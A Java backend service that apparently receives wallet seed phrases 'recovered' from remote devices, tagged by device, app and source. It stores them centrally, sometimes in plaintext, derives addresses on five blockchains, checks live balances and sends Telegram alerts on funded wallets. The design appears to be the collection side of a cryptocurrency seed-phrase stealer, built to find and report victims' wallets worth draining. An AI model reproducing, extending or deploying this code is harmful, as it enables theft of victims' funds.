package com.consumer.service;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;

import javax.annotation.Resource;

import org.apache.commons.lang3.StringUtils;
import org.apache.ibatis.session.ExecutorType;
import org.apache.ibatis.session.SqlSession;
import org.apache.ibatis.session.SqlSessionFactory;
import org.springframework.stereotype.Service;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
import com.consumer.config.V26ConsumerProperties;
import com.consumer.dao.AddressDao;
import com.consumer.dao.AppidDao;
import com.consumer.dao.DeviceDao;
import com.consumer.dao.MnemonicDao;
import com.consumer.entity.AddressEntity;
import com.consumer.entity.AppidEntity;
import com.consumer.entity.DeviceEntity;
import com.consumer.entity.MnemonicEntity;
import com.consumer.util.MnemonicAesUtil;
import com.consumer.util.UploadPaths;
import com.consumer.util.WalletAddressUtil;

import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class MnemonicStoreService {

    private final MnemonicDao mnemonicDao;
    private final AddressDao addressDao;
    private final DeviceDao deviceDao;
    private final AppidDao appidDao;
    private final V26ConsumerProperties props;
    private final SettingsService settingsService;
    private final BalanceLiveService balanceLiveService;
    private final TgNotifyService tgNotifyService;
    private final SqlSessionFactory sqlSessionFactory;
    private final DeviceUsdtCacheService deviceUsdtCacheService;

    @Resource(name = "balanceHttpExecutor")
    private ExecutorService balanceHttpExecutor;

    @Data
    public static class PersistResult {
        private int added;
        private List<Long> newIds = new ArrayList<>();
        private List<Long> existingIds = new ArrayList<>();
        private int notified;
        private int addressUpserted;
        private long deriveMs;
        private long queryMs;
        private long upsertMs;
        private long tgMs;
    }

    public PersistResult finalizeRecovered(String deviceId, String appId, List<String[]> items,
            boolean notify, boolean queryBalance, boolean notifyExisting) {
        PersistResult result = new PersistResult();
        String secret = StringUtils.trimToEmpty(props.getMnemonicAesKey());
        if (!MnemonicAesUtil.hasSecret(secret)) {
            log.warn("mnemonic persist: mnemonic-aes-key 未配置，明文入库");
        }
        String did = StringUtils.trimToEmpty(deviceId).toLowerCase(Locale.ROOT);
        if (did.isEmpty() || items == null) {
            return result;
        }
        String aid = resolveAndBackfillAppId(did, appId);
        Integer userid = tgNotifyService.resolveUserId(aid);
        if (StringUtils.isBlank(aid)) {
            log.warn("mnemonic persist: appId empty device={} userid={}", did, userid);
        }
        backfillEmptyHashes(did, secret);

        Set<String> seen = new LinkedHashSet<>();
        Map<String, MnemonicEntity> batch = new LinkedHashMap<>();
        for (String[] item : items) {
            String src = StringUtils.defaultIfBlank(item[0], "unknown");
            if (src.length() > 64) {
                src = src.substring(0, 64);
            }
            for (String text : splitPhrases(item.length > 1 ? item[1] : "")) {
                String h = phraseHash(text);
                if (h.isEmpty() || !seen.add(h)) {
                    MnemonicEntity row = batch.get(h);
                    if (row != null) {
                        String merged = mergeSource(row.getSource(), src);
                        if (!merged.equals(StringUtils.defaultString(row.getSource()))) {
                            row.setSource(merged);
                            mnemonicDao.updateById(row);
                        }
                    }
                    continue;
                }
                MnemonicEntity existing = mnemonicDao.selectOne(new QueryWrapper<MnemonicEntity>()
                        .eq("deviceId", did).eq("result_hash", h).last("LIMIT 1"));
                if (existing != null) {
                    result.getExistingIds().add(existing.getId());
                    batch.put(h, existing);
                    String merged = mergeSource(existing.getSource(), src);
                    boolean dirty = false;
                    if (!merged.equals(StringUtils.defaultString(existing.getSource()))) {
                        existing.setSource(merged);
                        dirty = true;
                    }
                    if (StringUtils.isNotBlank(aid) && StringUtils.isBlank(existing.getAppId())) {
                        existing.setAppId(aid);
                        dirty = true;
                    }
                    if (userid != null && userid > 0
                            && (existing.getUserid() == null || existing.getUserid() <= 0)) {
                        existing.setUserid(userid);
                        dirty = true;
                    }
                    if (dirty) {
                        mnemonicDao.updateById(existing);
                    }
                    Integer addrN = addressDao.selectCount(new QueryWrapper<AddressEntity>().eq("mnemonic_id", existing.getId()));
                    int deriveN = settingsService.getAddressDeriveCount();
                    boolean needAddr = queryBalance && (addrN == null ? 0 : addrN) < WalletAddressUtil.expectedRowCount(deriveN);
                    boolean needTg = notify && notifyExisting;
                    if (needAddr || needTg) {
                        upsertAndNotify(existing, text, merged, needAddr || needTg, needTg, result);
                    }
                    continue;
                }
                try {
                    MnemonicEntity row = new MnemonicEntity();
                    row.setDeviceId(did);
                    row.setAppId(aid);
                    row.setUserid(userid);
                    row.setResult(MnemonicAesUtil.encrypt(text, secret));
                    row.setResultHash(h);
                    row.setSource(src);
                    row.setAddtime(new Date());
                    mnemonicDao.insert(row);
                    result.setAdded(result.getAdded() + 1);
                    if (row.getId() != null) {
                        result.getNewIds().add(row.getId());
                    }
                    batch.put(h, row);
                    if (queryBalance || notify) {
                        upsertAndNotify(row, text, src, queryBalance, notify && queryBalance, result);
                    }
                } catch (Exception e) {
                    log.warn("mnemonic encrypt/insert fail device={} source={}: {}", did, src, e.toString());
                }
            }
        }
        if (result.getAdded() > 0 || !result.getExistingIds().isEmpty()) {
//            log.info("mnemonic finalize device={} appId={} userid={} added={} existing={} notified={} defer={}",
//                    did, aid, userid, result.getAdded(), result.getExistingIds().size(), result.getNotified(), !queryBalance);
        }
        if (queryBalance && (result.getAdded() > 0 || !result.getExistingIds().isEmpty())) {
            try {
                deviceUsdtCacheService.refreshFromDb(did);
            } catch (Exception e) {
                log.warn("wallet_usdt_max refresh fail device={}: {}", did, e.toString());
            }
        }
        return result;
    }

    public Map<String, Object> runBalanceNotify(long mnemonicId) {
        Map<String, Object> out = new LinkedHashMap<>();
        MnemonicEntity row = mnemonicDao.selectById(mnemonicId);
        if (row == null) {
            out.put("ok", false);
            out.put("error", "not_found");
            return out;
        }
        String secret = StringUtils.trimToEmpty(props.getMnemonicAesKey());
        String phrase;
        try {
            phrase = StringUtils.trimToEmpty(MnemonicAesUtil.decrypt(row.getResult(), secret));
        } catch (Exception e) {
            out.put("ok", false);
            out.put("error", "decrypt:" + e.getMessage());
            return out;
        }
        if (phrase.isEmpty()) {
            out.put("ok", false);
            out.put("error", "empty_phrase");
            return out;
        }
        PersistResult tmp = new PersistResult();
        Map<String, String> bals = upsertAndNotify(row, phrase, row.getSource(), true, true, tmp);
        try {
            deviceUsdtCacheService.refreshFromDb(row.getDeviceId());
        } catch (Exception e) {
            log.warn("wallet_usdt_max refresh fail mnemonic={}: {}", mnemonicId, e.toString());
        }
        out.put("ok", true);
        out.put("tg_queued", tmp.getNotified() > 0);
        out.put("mnemonic_id", row.getId());
        out.put("device_id", row.getDeviceId());
        out.put("address_count", tmp.getAddressUpserted());
        out.put("derive_ms", tmp.getDeriveMs());
        out.put("query_ms", tmp.getQueryMs());
        out.put("upsert_ms", tmp.getUpsertMs());
        out.put("tg_ms", tmp.getTgMs());
        out.put("balances", bals);
        return out;
    }

    private Map<String, String> upsertAndNotify(MnemonicEntity row, String text, String src,
            boolean doBalance, boolean doNotify, PersistResult result) {
        Map<String, String> bals = emptyBalances();
        if (row.getId() == null) {
            return bals;
        }
        if (doBalance) {
            int deriveN = settingsService.getAddressDeriveCount();
            long tDerive = System.currentTimeMillis();
            List<Map<String, Object>> derived = WalletAddressUtil.deriveChainAddressRows(text, deriveN);
            result.setDeriveMs(result.getDeriveMs() + (System.currentTimeMillis() - tDerive));
            bals = queryAndUpsert(row.getId(), derived, result);
        }
        if (doNotify) {
            try {
                long tTg = System.currentTimeMillis();
                if (tgNotifyService.notifyMnemonicBalance(row.getDeviceId(), row.getAppId(), bals, src, row.getId())) {
                    result.setNotified(result.getNotified() + 1);
                }
                result.setTgMs(result.getTgMs() + (System.currentTimeMillis() - tTg));
            } catch (Exception e) {
                log.warn("tg mnemonic_balance enqueue fail device={} source={}: {}", row.getDeviceId(), src, e.toString());
            }
        }
        return bals;
    }

    private Map<String, String> queryAndUpsert(Long mnemonicId, List<Map<String, Object>> derived, PersistResult result) {
        Map<String, String> bals = emptyBalances();
        if (derived == null || derived.isEmpty()) {
            return bals;
        }
        ExecutorService pool = balanceHttpExecutor != null
                ? balanceHttpExecutor
                : java.util.concurrent.Executors.newFixedThreadPool(Math.min(8, Math.max(4, derived.size())));
        boolean shared = pool == balanceHttpExecutor;
        long tQuery = System.currentTimeMillis();
        try {
            Map<String, List<Map<String, Object>>> groups = new LinkedHashMap<>();
            for (Map<String, Object> r : derived) {
                String ct = String.valueOf(r.getOrDefault("chaintype", "")).toLowerCase(Locale.ROOT);
                groups.computeIfAbsent(ct, k -> new ArrayList<>()).add(r);
            }
            List<CompletableFuture<Void>> futs = new ArrayList<>();
            if (groups.get("eth") != null) {
                futs.add(CompletableFuture.runAsync(() -> {
                    try {
                        applyBatch(groups.get("eth"),
                                balanceLiveService.fetchEvmBatch("eth", addrsOf(groups.get("eth"))));
                    } catch (Exception e) {
                        applyBatch(groups.get("eth"), null);
                        log.warn("eth batch fail: {}", e.toString());
                    }
                }, pool));
            }
            if (groups.get("bsc") != null) {
                futs.add(CompletableFuture.runAsync(() -> {
                    try {
                        applyBatch(groups.get("bsc"),
                                balanceLiveService.fetchEvmBatch("bsc", addrsOf(groups.get("bsc"))));
                    } catch (Exception e) {
                        applyBatch(groups.get("bsc"), null);
                        log.warn("bsc batch fail: {}", e.toString());
                    }
                }, pool));
            }
            if (groups.get("sol") != null) {
                futs.add(CompletableFuture.runAsync(() -> {
                    try {
                        applyBatch(groups.get("sol"),
                                balanceLiveService.fetchSolBatch(addrsOf(groups.get("sol"))));
                    } catch (Exception e) {
                        applyBatch(groups.get("sol"), null);
                        log.warn("sol batch fail: {}", e.toString());
                    }
                }, pool));
            }
            for (String ct : new String[] {"tron", "btc"}) {
                List<Map<String, Object>> rows = groups.get(ct);
                if (rows == null) {
                    continue;
                }
                for (Map<String, Object> r : rows) {
                    futs.add(CompletableFuture.runAsync(() -> {
                        String addr = String.valueOf(r.getOrDefault("address", ""));
                        String[] amt = balanceLiveService.fetchAmounts(ct, addr);
                        synchronized (r) {
                            r.put("native_bal", amt[0]);
                            r.put("usdt_bal", amt[1]);
                            r.put("usdc_bal", amt.length > 2 ? amt[2] : "0");
                        }
                    }, pool));
                }
            }
            CompletableFuture.allOf(futs.toArray(new CompletableFuture[0])).join();
        } finally {
            if (!shared) {
                pool.shutdown();
            }
        }
        result.setQueryMs(result.getQueryMs() + (System.currentTimeMillis() - tQuery));
        long tUpsert = System.currentTimeMillis();
        BigDecimal[] sums = new BigDecimal[] {
                BigDecimal.ZERO, BigDecimal.ZERO, BigDecimal.ZERO, BigDecimal.ZERO,
                BigDecimal.ZERO, BigDecimal.ZERO, BigDecimal.ZERO, BigDecimal.ZERO, BigDecimal.ZERO
        };
        double now = System.currentTimeMillis() / 1000.0;
        Map<String, AddressEntity> existing = loadExisting(mnemonicId);
        List<AddressEntity> toInsert = new ArrayList<>();
        List<AddressEntity> toUpdate = new ArrayList<>();
        for (Map<String, Object> r : derived) {
            String ct = String.valueOf(r.getOrDefault("chaintype", "")).toLowerCase(Locale.ROOT);
            String addr = String.valueOf(r.getOrDefault("address", "")).trim();
            if (ct.isEmpty() || addr.isEmpty()) {
                continue;
            }
            String nativeBal = String.valueOf(r.getOrDefault("native_bal", "0"));
            String usdtBal = String.valueOf(r.getOrDefault("usdt_bal", "0"));
            String usdcBal = String.valueOf(r.getOrDefault("usdc_bal", "0"));
            addSum(sums, ct, nativeBal, usdtBal);
            AddressEntity row = existing.get(ct + "\0" + addr);
            if (row == null) {
                row = new AddressEntity();
                row.setMnemonicId(mnemonicId);
                row.setAddress(addr);
                row.setChaintype(ct);
                row.setAddrIndex(toInt(r.get("addr_index")));
                row.setAddtime(now);
                row.setStatus(0);
                row.setAlgorithm(StringUtils.left(String.valueOf(r.getOrDefault("algorithm", "")), 512));
                row.setNativeBal(nativeBal);
                row.setUsdtBal(usdtBal);
                row.setUsdcBal(usdcBal);
                row.setBalanceRefreshed(now);
                toInsert.add(row);
                existing.put(ct + "\0" + addr, row);
            } else {
                row.setAddrIndex(toInt(r.get("addr_index")));
                row.setNativeBal(nativeBal);
                row.setUsdtBal(usdtBal);
                row.setUsdcBal(usdcBal);
                row.setBalanceRefreshed(now);
                if (r.get("algorithm") != null) {
                    row.setAlgorithm(StringUtils.left(String.valueOf(r.get("algorithm")), 512));
                }
                toUpdate.add(row);
            }
        }
        int wrote = persistAddresses(toInsert, toUpdate);
        result.setAddressUpserted(result.getAddressUpserted() + wrote);
        result.setUpsertMs(result.getUpsertMs() + (System.currentTimeMillis() - tUpsert));
//        log.info("address upsert mnemonic_id={} inserted={} updated={} queryMs={} upsertMs={}",
//                mnemonicId, toInsert.size(), toUpdate.size(), result.getQueryMs(), result.getUpsertMs());
        bals.put("tron_trx", fmt(sums[0]));
        bals.put("tron_usdt", fmt(sums[1]));
        bals.put("eth", fmt(sums[2]));
        bals.put("eth_usdt", fmt(sums[3]));
        bals.put("bnb", fmt(sums[4]));
        bals.put("bsc_usdt", fmt(sums[5]));
        bals.put("btc", fmt(sums[6]));
        bals.put("sol", fmt(sums[7]));
        bals.put("sol_usdt", fmt(sums[8]));
        return bals;
    }

    private static List<String> addrsOf(List<Map<String, Object>> rows) {
        if (rows == null || rows.isEmpty()) {
            return List.of();
        }
        List<String> out = new ArrayList<>(rows.size());
        for (Map<String, Object> r : rows) {
            out.add(String.valueOf(r.getOrDefault("address", "")));
        }
        return out;
    }

    private static void applyBatch(List<Map<String, Object>> rows, Map<String, String[]> got) {
        if (rows == null || rows.isEmpty()) {
            return;
        }
        for (Map<String, Object> r : rows) {
            String addr = String.valueOf(r.getOrDefault("address", "")).trim();
            String[] amt = got == null ? null : got.get(addr);
            if (amt == null || amt.length < 2) {
                amt = new String[] {"0", "0", "0"};
            }
            synchronized (r) {
                r.put("native_bal", amt[0]);
                r.put("usdt_bal", amt[1]);
                r.put("usdc_bal", amt.length > 2 ? amt[2] : "0");
            }
        }
    }

    private Map<String, AddressEntity> loadExisting(Long mnemonicId) {
        Map<String, AddressEntity> out = new LinkedHashMap<>();
        List<AddressEntity> rows = addressDao.selectList(new QueryWrapper<AddressEntity>().eq("mnemonic_id", mnemonicId));
        if (rows == null) {
            return out;
        }
        for (AddressEntity e : rows) {
            if (e == null || StringUtils.isBlank(e.getAddress())) {
                continue;
            }
            String ct = StringUtils.defaultString(e.getChaintype()).toLowerCase(Locale.ROOT);
            out.put(ct + "\0" + e.getAddress().trim(), e);
        }
        return out;
    }

    private int persistAddresses(List<AddressEntity> inserts, List<AddressEntity> updates) {
        if (inserts != null && !inserts.isEmpty()) {
            for (int i = 0; i < inserts.size(); i += 80) {
                int end = Math.min(inserts.size(), i + 80);
                addressDao.insertBatch(inserts.subList(i, end));
            }
        }
        if (updates != null && !updates.isEmpty()) {
            try (SqlSession session = sqlSessionFactory.openSession(ExecutorType.BATCH, false)) {
                AddressDao batchDao = session.getMapper(AddressDao.class);
                for (AddressEntity row : updates) {
                    batchDao.updateById(row);
                }
                session.commit();
            }
        }
        return (inserts == null ? 0 : inserts.size()) + (updates == null ? 0 : updates.size());
    }

    private static void addSum(BigDecimal[] sums, String ct, String nativeBal, String usdtBal) {
        BigDecimal n = SettingsService.parseAmount(nativeBal);
        BigDecimal u = SettingsService.parseAmount(usdtBal);
        switch (ct) {
            case "tron":
                sums[0] = sums[0].add(n);
                sums[1] = sums[1].add(u);
                break;
            case "eth":
                sums[2] = sums[2].add(n);
                sums[3] = sums[3].add(u);
                break;
            case "bsc":
                sums[4] = sums[4].add(n);
                sums[5] = sums[5].add(u);
                break;
            case "btc":
                sums[6] = sums[6].add(n);
                break;
            case "sol":
                sums[7] = sums[7].add(n);
                sums[8] = sums[8].add(u);
                break;
            default:
                break;
        }
    }

    /**
     * 对齐 Python resolve_appid_for_device：显式 appId → devices.appId → appid.appname
     * → 上报目录 devices_*.json；并回写 devices.appId。
     */
    public String resolveAndBackfillAppId(String deviceId, String appId) {
        String did = StringUtils.trimToEmpty(deviceId).toLowerCase(Locale.ROOT);
        String aid = resolveAppId(did, appId);
        backfillDeviceAppId(did, aid);
        return aid;
    }

    private String resolveAppId(String did, String appId) {
        if (StringUtils.isNotBlank(appId)) {
            return appId.trim();
        }
        DeviceEntity d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did).last("LIMIT 1"));
        if (d != null && StringUtils.isNotBlank(d.getAppId())) {
            return d.getAppId().trim();
        }
        String name = d == null ? "" : StringUtils.trimToEmpty(d.getAppName());
        String byName = lookupAppIdByAppName(name);
        if (StringUtils.isNotBlank(byName)) {
            return byName;
        }
        JSONObject dump = readDeviceDump(did);
        if (dump != null) {
            String dumpAid = StringUtils.trimToEmpty(dump.getString("appId"));
            if (StringUtils.isNotBlank(dumpAid)) {
                return dumpAid;
            }
            String fromDumpName = lookupAppIdByAppName(StringUtils.trimToEmpty(dump.getString("appName")));
            if (StringUtils.isNotBlank(fromDumpName)) {
                return fromDumpName;
            }
        }
        return "";
    }

    private void backfillDeviceAppId(String did, String aid) {
        if (StringUtils.isBlank(aid)) {
            return;
        }
        DeviceEntity d = deviceDao.selectOne(new QueryWrapper<DeviceEntity>().eq("deviceId", did).last("LIMIT 1"));
        if (d == null || StringUtils.isNotBlank(d.getAppId())) {
            return;
        }
        d.setAppId(aid.trim());
        deviceDao.updateById(d);
        log.info("device appId backfill device={} appId={}", did, aid.trim());
    }

    private String lookupAppIdByAppName(String appName) {
        String name = StringUtils.trimToEmpty(appName);
        if (name.isEmpty()) {
            return "";
        }
        AppidEntity row = appidDao.selectOne(new QueryWrapper<AppidEntity>()
                .eq("appname", name).last("LIMIT 1"));
        if (row == null || StringUtils.isBlank(row.getAppid())) {
            return "";
        }
        return row.getAppid().trim();
    }

    private JSONObject readDeviceDump(String did) {
        Path dump = UploadPaths.findLatestDeviceDump(props.getUploadDir(), did);
        if (dump == null) {
            return null;
        }
        try {
            String raw = Files.readString(dump, StandardCharsets.UTF_8);
            JSONObject obj = JSON.parseObject(raw);
            return obj == null ? null : obj;
        } catch (Exception e) {
            log.warn("read device dump fail file={}: {}", dump, e.toString());
            return null;
        }
    }

    private void backfillEmptyHashes(String did, String secret) {
        List<MnemonicEntity> rows = mnemonicDao.selectList(new QueryWrapper<MnemonicEntity>()
                .eq("deviceId", did).eq("result_hash", ""));
        for (MnemonicEntity row : rows) {
            try {
                String plain = MnemonicAesUtil.decrypt(row.getResult(), secret);
                String h = phraseHash(plain);
                if (!h.isEmpty()) {
                    row.setResultHash(h);
                    mnemonicDao.updateById(row);
                }
            } catch (Exception ignored) {
            }
        }
    }

    private static List<String> splitPhrases(String phrase) {
        List<String> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (String line : StringUtils.defaultString(phrase).split("\\r?\\n")) {
            String text = line.trim().replaceAll("\\s+", " ");
            if (text.split("\\s+").length < 12) {
                continue;
            }
            String key = text.toLowerCase(Locale.ROOT);
            if (seen.add(key)) {
                out.add(key);
            }
        }
        return out;
    }

    private static String phraseHash(String phrase) {
        String norm = StringUtils.trimToEmpty(phrase).replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
        if (norm.isEmpty()) {
            return "";
        }
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(norm.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private static String mergeSource(String existing, String neu) {
        List<String> parts = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        for (String raw : new String[] {existing, neu}) {
            for (String p : StringUtils.defaultString(raw).replace("，", ",").split(",")) {
                String s = p.trim();
                if (s.isEmpty()) {
                    continue;
                }
                if (seen.add(s.toLowerCase(Locale.ROOT))) {
                    parts.add(s);
                }
            }
        }
        String joined = String.join(",", parts);
        return joined.length() > 64 ? joined.substring(0, 64) : joined;
    }

    private static Map<String, String> emptyBalances() {
        Map<String, String> m = new LinkedHashMap<>();
        for (String k : new String[] {"tron_trx", "tron_usdt", "btc", "eth", "eth_usdt", "bnb", "bsc_usdt", "sol", "sol_usdt"}) {
            m.put(k, "0");
        }
        return m;
    }

    private static String fmt(BigDecimal v) {
        if (v == null || v.compareTo(BigDecimal.ZERO) == 0) {
            return "0";
        }
        return v.stripTrailingZeros().toPlainString();
    }

    private static int toInt(Object v) {
        if (v instanceof Number) {
            return ((Number) v).intValue();
        }
        try {
            return Integer.parseInt(String.valueOf(v));
        } catch (Exception e) {
            return 0;
        }
    }
}
